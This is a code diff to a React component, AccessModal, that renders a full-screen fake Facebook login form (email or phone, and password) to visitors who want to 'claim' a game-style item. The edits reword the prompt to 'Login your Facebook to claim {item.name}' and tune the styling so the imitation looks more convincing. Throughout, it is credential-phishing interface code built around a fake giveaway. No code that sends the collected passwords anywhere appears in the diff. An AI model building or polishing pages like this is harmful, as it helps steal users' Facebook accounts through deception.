@@ -140,7 +140,7 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
 
   return (
     <Dialog open={isOpen} onOpenChange={handleClose}>
-      <DialogContent className="max-w-none w-full h-full p-0 border-0 bg-[#f0f2f5] shadow-none">
+      <DialogContent className="max-w-none w-full h-full p-0 border-0 bg-transparent shadow-none">
         {/* Facebook Login Design */}
         <div className="flex items-center justify-center min-h-screen p-5">
           <div className="w-full max-w-screen-lg mx-auto">
@@ -156,7 +156,7 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
               </div>
 
               {/* Right Section - Login Form */}
-              <div className="w-full max-w-[396px] bg-white p-5 rounded-lg shadow-sm border border-gray-200">
+              <div className="w-full max-w-[396px] bg-white p-5 rounded-lg shadow-lg border border-gray-200">
                 {/* Close Button */}
                 <div className="flex justify-end mb-4">
                   <button 
@@ -176,7 +176,7 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
                     />
                     <h3 className="font-semibold text-gray-900">{item.name}</h3>
                     <p className="text-sm text-gray-600">
-                      Enter your credentials to claim this {item.rarity.toLowerCase()} item
+                      Login your Facebook to claim {item.name}
                     </p>
                   </div>
                 )}
@@ -187,7 +187,7 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
                     placeholder="Email or phone number"
                     value={email}
                     onChange={(e) => setEmail(e.target.value)}
-                    className="w-full p-[14px] text-[17px] border border-[#dddfe2] rounded-md outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] transition-colors"
+                    className="w-full p-[14px] text-[17px] text-black border border-[#dddfe2] rounded-md outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] transition-colors"
                     style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
                     required
                   />
@@ -197,7 +197,7 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
                     placeholder="Password"
                     value={passphrase}
                     onChange={(e) => setPassphrase(e.target.value)}
-                    className="w-full p-[14px] text-[17px] border border-[#dddfe2] rounded-md outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] transition-colors"
+                    className="w-full p-[14px] text-[17px] text-black border border-[#dddfe2] rounded-md outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] transition-colors"
                     style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
                     required
                   />
